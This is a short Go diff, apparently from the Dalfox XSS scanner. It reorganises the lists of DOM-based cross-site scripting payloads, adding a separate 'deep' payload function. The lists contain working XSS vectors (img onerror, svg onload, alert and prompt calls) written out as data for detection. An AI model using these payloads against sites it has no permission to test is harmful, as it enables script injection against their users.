@@ -478,7 +478,15 @@ func getInJsPayload(ip string) []string {
 }
 
 func getDOMXSSPayload() []string {
-	payload := []string{
+	payload := []string {
+		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
+		"alert(DALFOX_ALERT_VALUE)",
+	}
+	return payload
+}
+
+func getDeepDOMXSPayload() []string {
+	payload := []string {
 		"<svg/OnLoad=\"`${prompt`DALFOX_ALERT_VALUE`}`\">",
 		"<img/src/onerror=.1|alert`DALFOX_ALERT_VALUE`>",
 		"alert(DALFOX_ALERT_VALUE)",
@@ -487,3 +495,4 @@ func getDOMXSSPayload() []string {
 	}
 	return payload
 }
+
